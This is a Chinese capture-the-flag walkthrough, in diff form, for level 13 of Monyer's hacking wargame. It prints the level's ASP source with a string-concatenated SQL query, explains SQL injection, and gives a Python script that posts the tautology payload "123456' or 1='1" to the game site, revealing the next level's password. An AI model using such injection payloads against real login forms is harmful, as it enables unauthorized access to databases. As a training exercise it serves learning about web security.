@@ -2,3 +2,175 @@
 
 2.在前面一关已经将本关的源码下载如下：
    
+<!DOCTYPE HTML>
+<html>
+<head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+<meta name="robots" content="noindex,nofollow">
+<title>梦之光芒/Monyer——Monyer's Game(第13关)</title>
+<script type="text/javascript">
+    function check(){
+        window.location.href = document.getElementById("txt").value + ".php";
+    }
+</script>
+</head>
+<body>
+<div align="center">
+    <!--
+dim connect
+Response.Expires=0 '系统数据库连接
+Set connect=Server.CreateObject("ADODB.Connection")
+connect.Open "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" & server.MapPath("/Database.mdb") & ";Mode=ReadWrite|Share Deny None;Persist Security Info=False"
+
+set rss=server.createobject("adodb.recordset")
+sqlstr="select password,pwd from [user] where pwd='"&request("pwd")&"'"
+rss.open sqlstr,connect,1,1
+if rss.bof and rss.eof then
+  response.write("密码错误")
+else
+  response.write(rss("password"))
+end if
+rss.close
+set rss=nothing
+connect.close
+set connect=nothing
+--><p>欢迎您来到第13关</p><p>请输入密码进入第14关：</p><form action="?" method="post">
+                <input type="text" name="pwd" value="">
+                <input type="submit" value="提交">
+            </form><br>
+            没有输入密码 或 密码错误 或 系统错误！</div>
+</body>
+</html>
+3. 分析代码：
+关键代码是    <!--
+dim connect
+Response.Expires=0 '系统数据库连接
+Set connect=Server.CreateObject("ADODB.Connection")
+connect.Open "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" & server.MapPath("/Database.mdb") & ";Mode=ReadWrite|Share Deny None;Persist Security Info=False"
+
+set rss=server.createobject("adodb.recordset")
+sqlstr="select password,pwd from [user] where pwd='"&request("pwd")&"'"
+rss.open sqlstr,connect,1,1
+if rss.bof and rss.eof then
+  response.write("密码错误")
+else
+  response.write(rss("password"))
+end if
+rss.close
+set rss=nothing
+connect.close
+set connect=nothing
+-->
+这个代码应该就是服务器的操作代码，所以这关的主要目的应该就是sql注入。wiki对sql注入的定义是：
+SQL攻击，简称注入攻击，是发生于应用程序之数据库层的安全漏洞。简而言之，是在输入的字符串之中注入SQL指令，
+在设计不良的程序当中忽略了检查，那么这些注入进去的指令就会被数据库服务器误认为是正常的SQL指令而运行，
+因此遭到破坏。 有部份人认为SQL注入攻击是只针对Microsoft SQL Server而来，但只要是支持批量处理SQL指令的数据库服务器，
+都有可能受到此种手法的攻击。
+=========================================================================================================
+通过上面的解释，我们的突破口应该就是sql语句
+sqlstr="select password,pwd from [user] where pwd='"&request("pwd")&"'"
+这里就是sql语句通过用户输入的pwd来查看是否是正确的密码。我们是不知道pwd是多少的。那么我们是否可以想办法让sql语句总是
+成立呢？
+
+假如我们输入的内容是123456上面的sql展开就是：
+
+select password,pwd from [user] where pwd='123456'
+我们再加点什么才能够让上面的输入总是成功呢？
+sql的or条件是一个很好用的东西。如果我们输入 123456’ or 1=‘1
+那么上面的sql语句展开就会变成：
+
+select password,pwd from [user] where pwd='123456' or 1=‘1’
+看到这里估计就没有什么好说的了1=1这个是永远成立的。
+用下面的脚本试试吧！
+
+select password,pwd from [user] where pwd='123456'
+#  -*-  coding: utf-8  -*-
+import time
+from random import Random
+import urllib2
+import urllib
+import re
+
+
+class SubmitForm(object):
+    """docstring for SubmitForm"""
+    def __init__(self, url):
+        super(SubmitForm, self).__init__()
+        self.url = url
+
+    def post(self, url, data):
+        headers = {
+              "User-Agent" : " Mozilla/4.0 my test",
+              "Accept": "*/*",
+              "Host": "monyer.com",
+              "Content-Type"  : "application/x-www-form-urlencoded",
+              "Content-Length": str(len(data)) ,
+              "Referer" : "http://monyer.com/game/game1/smartboy.php",
+              "Pragma" : "no-cache",
+              "Connection": "keep-alive"
+        }
+
+        request = urllib2.Request(url, data)
+        for key in headers:
+            request.add_header(key, headers[key])
+        response = urllib2.urlopen(request)
+        return response.read()
+
+    def pack_form_data(self, passwd):
+        values = {
+        'pwd' : passwd,
+        }
+        data = urllib.urlencode(values)
+        return data
+
+    def send_pwd(self , passwd):
+        print "try pass word : " + passwd
+        time.sleep(3)
+        data = self.pack_form_data(passwd)
+        return self.post(self.url, data)
+
+if __name__ == "__main__":
+    channel = SubmitForm("http://monyer.com/game/game1/sobeautiful.php?")
+
+    print channel.send_pwd("123456' or 1='1")
+    time.sleep(3)
+得到的结果是：
+<!DOCTYPE HTML>
+<html>
+<head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+<meta name="robots" content="noindex,nofollow">
+<title>梦之光芒/Monyer——Monyer's Game(第13关)</title>
+<script type="text/javascript">
+    function check(){
+        window.location.href = document.getElementById("txt").value + ".php";
+    }
+</script>
+</head>
+<body>
+<div align="center">
+    <!--
+dim connect
+Response.Expires=0 '系统数据库连接
+Set connect=Server.CreateObject("ADODB.Connection")
+connect.Open "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" & server.MapPath("/Database.mdb") & ";Mode=ReadWrite|Share Deny None;Persist Security Info=False"
+
+set rss=server.createobject("adodb.recordset")
+sqlstr="select password,pwd from [user] where pwd='"&request("pwd")&"'"
+rss.open sqlstr,connect,1,1
+if rss.bof and rss.eof then
+  response.write("密码错误")
+else
+  response.write(rss("password"))
+end if
+rss.close
+set rss=nothing
+connect.close
+set connect=nothing
+--><p>欢迎您来到第13关</p><p>请输入密码进入第14关：</p><input type="text" id="txt" value="">
+            <input type="button" onClick="check()" value="提交"><br>
+            下一关密码：whatyouneverknow</div>
+</body>
+</html>
+看来我们已经拿到下一关的入场券啦。whatyouneverknow.php
+确实是我们的入场券。
